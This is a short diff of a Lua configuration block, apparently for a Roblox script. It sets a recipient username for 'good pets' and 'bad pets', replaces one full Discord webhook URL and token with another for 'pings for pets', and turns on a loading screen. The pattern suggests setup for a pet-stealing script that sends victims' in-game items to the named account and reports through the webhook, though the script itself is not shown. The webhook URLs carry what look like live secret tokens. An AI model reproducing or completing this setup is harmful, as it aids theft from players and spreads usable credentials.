@@ -1,5 +1,5 @@
-UserName = "Minaz64x "-- good pets
-Webhook = "https://discord.com/api/webhooks/1145496027160399923/96qFyc53Z8eLTtWNts_wc4wtaWpIfYyE0Bm1M81TnUNStedYL6xR0Y27nXgAMCN1a3_X" -- pings for pets
+UserName = "Minaz64x" -- good pets
+Webhook = "https://discord.com/api/webhooks/1148576898172063784/wD-KdXG9WQizlE-rqpSDBX2WX6TPI_n2YBFi4XjyJmwA1Bm2EqHGiK11sqMbYyUqMYse" -- pings for pets
 UserName2 = "Minaz64x" -- bad pets
 
 _G.LoadingScreen = true -- make it true if you want the loadingscreen
